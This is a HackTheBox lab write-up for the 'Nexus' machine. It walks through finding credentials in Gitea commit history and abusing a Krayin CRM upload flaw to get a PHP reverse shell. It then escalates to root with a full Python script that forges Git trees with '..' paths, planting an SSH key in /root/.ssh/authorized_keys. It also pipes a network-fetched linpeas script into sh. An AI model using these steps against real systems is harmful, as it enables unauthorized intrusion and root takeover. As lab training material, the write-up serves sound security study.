HackTheBox — Nexus Writeup

Gaining access on Nexus

Platform: HackTheBox
Difficulty: Easy
Date completed: 2026-08-03

Overview

So, I just wrapped up "Nexus," an easy-medium-difficulty machine on HackTheBox, and man, what a ride. This box is a fantastic playground for understanding how Gitea handles repository configurations and, more importantly, how Git actually structures objects under the hood. The main takeaway here is definitely how dangerous directory traversal can be when automated scripts blindly trust file paths inside Git trees, leading to a neat path traversal exploit that got us root.

Enumeration

Alright, let's start from the beginning. First things first, I fired up a classic Nmap scan to see what we were dealing with:

nmap -sC -sV 10.129.234.54

The scan came back showing just two open ports: SSH on port 22 and HTTP on port 80 (running Nginx). Nmap also flagged that it tried to redirect to http://nexus.htb/ but failed. This is a classic DNS resolution issue—the target machine doesn't know how to resolve that hostname out of the box.

To fix this, I simply mapped the IP to the domain name in my local /etc/hosts file:

sudo nano /etc/hosts

And added the line:

10.129.234.54   nexus.htb

(Pro-tip I noted down: you can do this much quicker with sudo sh -c 'echo "nexus.htb 10.129.234.54" >> /etc/hosts' next time!)

Once the hostname was resolved, I poked around the main webpage. Honestly, there wasn’t a whole lot of obvious stuff, but I did manage to harvest two emails that looked interesting: careers@nexus.htb and j.matthew@nexus.htb. Write those down, always useful!

Since the front page was a bit of a dead end, I figured there had to be some subdomains hiding somewhere. I brought out ffuf to fuzz for subdomains using a top 1 million list, filtering out the noise with -fs 154:

ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://nexus.htb:80 -H 'Host: FUZZ.nexus.htb' -fs 154

Bingo! It found two subdomains:
1. git (Status 200)
2. billing (Status 302)

I went ahead and added both subdomains to my /etc/hosts file so my browser could actually reach them.

First, I checked out the git subdomain. It led to a Gitea instance:

I started digging around Gitea and found a public repository called krayin-docker-setup. While looking through the files, I noticed an exposed .env file containing some default database passwords. But what really saved the day was looking at the Git commit history. I spotted a deleted line in a previous commit containing a CRM password: N27xh!!2ucY04.

Now, armed with this password, I headed over to the billing subdomain. I first tried logging in with the default email from the .env file (laravel@krayincrm.com), but no luck. Then I remembered the emails I grabbed earlier. I tried logging in as the hiring manager using j.matthew@nexus.htb and the password N27xh...ucY04... and boom, we were in!

Exploitation

The dashboard itself was pretty quiet, but it did show the CRM version: Krayin CRM version 2.2.0.

I did a bit of research online and discovered that this version is vulnerable to CVE-2026-38526. The key vector here is the POST /admin/tinymce/upload endpoint, which let me execute code and grab an initial shell on the machine.

The endpoint is on the upload file on the compose email tab. I used burpsuite to inteject the traffic then edit the file contents.

First I saved a simple php payload with .png extension, then uploaded it via the endpoint. From the interjected traffic, I made some edits and removed the .png to php. If successfull, a reply is sent back with the file location where that file got saved.

This was just a simple test to confirm whether I could plant a payload and execute it. Since it was a success, I planted a php reverse shell script.

Oh, remember you ought to have a listener up based on the specified script's ip and port.

Once I got the shell, it felt a bit shaky, so I immediately stabilized it using:

script /dev/null -c /bin/bash

I ran ls -la to check the directory and located the local .env file. Inside, I found another password: y27xb3h...74GbR.

Next, I checked out /etc/passwd to see who actually lives on this system:

Privilege Escalation

Now for the hard part: getting root. I started with my standard manual checks—SUID binaries, cron jobs, active processes—but nothing stood out:

find /perm -4000 -type f 2>/dev/null

Nothing juicy. So, I hosted linpeas.sh on my attacker machine and curled it over:

# On my machine
python -m http.server 8888

# On the victim (jones ssh session)
curl <my_ip>:8888/linpeas.sh | sh

After scanning through the massive Linpeas output, something interesting caught my eye:

Additional timer files: (T1053.003)                                              
Potential privilege escalation in timer file: /etc/systemd/system/gitea-template-sync.timer
  └─ RELATIVE_PATH: Uses relative path in Unit directive

I'll admit, privilege escalation sometimes makes me scratch my head, but seeing this timer pointed me in the right direction. I checked active timers using a command I'm definitely adding to my permanent toolbox:

systemctl list-timers

This timer triggers gitea-template-sync.service every single minute, which in turn runs a Python script located at /etc/gitea/template-sync.py.

I spent some time analyzing what this script does:
1. load_config(): Reads configurations from /etc/gitea/template-sync.conf and /opt/forge/app/.env to retrieve a GITEA_API_TOKEN.
2. get_template_repos(token): Searches Gitea's API for repositories marked as template: true.
3. sync_template(repo_info): For each template repo, it finds the raw repository path on disk, runs git ls-tree -r HEAD to get all blobs, runs git cat-file blob <hash> to pull their contents, and writes them to a staging directory using os.path.join(stage_path, filepath).

The vulnerability: The script directly joins stage_path and filepath without sanitizing filepath first! Because it doesn't check if the path climbs out of the staging directory, we can use directory traversal (../) to write files absolutely anywhere on the filesystem that the script (running as root) has access to.

Normally, Gitea and Git won't let you commit files containing .. pathing. To bypass this restriction, we have to construct the Git objects (blobs and trees) manually from scratch using a Python script.

Here’s how Git structures things under the hood:
* Blob: Stores raw file content.
* Tree: Acts like a directory, storing names, permissions, and SHA-1 hashes of blobs or other sub-trees.
* Commit: A snapshot containing metadata pointing to the root tree.

By writing a custom script, we can generate a tree object that explicitly names a directory entry ... When the synchronization script processes our custom repository, it will recursively join those .. directories, escape the staging folder, and write our public SSH key directly into /root/.ssh/authorized_keys.

I used a custom script (python_git.py) to build this payload structure. Side note: I didn't not fully write the script. I got it from here.

#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat","/tmp/mykey.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -f /tmp/mykey -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"

blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)

First, I created a new repository on Gitea using my logged-in user and flagged it as a template repository.

Next, on the victim machine inside /tmp, I generated a new SSH keypair:

ssh-keygen -t ed25519 -f /tmp/mykey -N ''

Then, I cloned my empty template repository to /tmp:

git clone http://jones:'y27xb3ha....4GbR'@localhost:3000/jones/rooted-repo

I moved into the repository folder, dropped the python_git.py script in, and ran it. It generated the custom Git objects successfully:

jones@nexus:/tmp/rooted-repo$ python3 ../python_git.py
Done: efe5055d4196ba1f06bd963212709360710e6624

I noticed that trying to push without a physical README.md file caused the sync execution to fail. To make sure everything pushed correctly, I touched a physical README.md first:

touch README.md

I checked my custom tree structure using git ls-tree to make sure the traversal path was correctly pointing to the root SSH directory:

jones@nexus:/tmp/rooted$ git ls-tree -r main
100644 blob 3ccfeb4c0b22a9f47e1beb3ca9f8111454b043af    ../../../../../root/.ssh/authorized_keys
100644 blob c296a5f621e8f1d1536d8b671d272a96a5d22a7d    README.md

It looked absolutely perfect. I went ahead and force-pushed it to Gitea:

git push -u origin main --force

During the push, I saw some "Permission denied" errors:

warning: unable to access '../../../../../root/.gitattributes': Permission denied
warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied

I panicked for a second thinking it failed, but then realized this is actually normal. The user jones doesn't have permissions to read those root-level folders, but the Gitea sync service running as root does.

I waited a minute for the systemd timer to trigger the Python sync script. Once it ran, I attempted to SSH as root using our generated private key:

ssh -i /tmp/mykey root@localhost

And... yes! We logged in as root!

root@nexus:~# cat root.txt
.............................

Key Takeaways

  • Git Under the Hood: This lab forced me to learn how Git actually serializes objects (blobs, trees, commits) as zlib-compressed binary files. Truly understanding this made writing the custom path traversal payload actually make sense.
  • Path Traversal in Scripts: Never trust file paths extracted from archives, repositories, or external inputs when running automated tasks with elevated privileges. Always use safety wrappers like verifying the resolved absolute path stays within the intended target directory.
  • Systemd Timers: Paying attention to active systemd timers via systemctl list-timers is a highly effective way to find custom automation scripts that might be running with high privileges.

Tools Used

  • Nmap (Port scanning)
  • ffuf (Subdomain fuzzing)
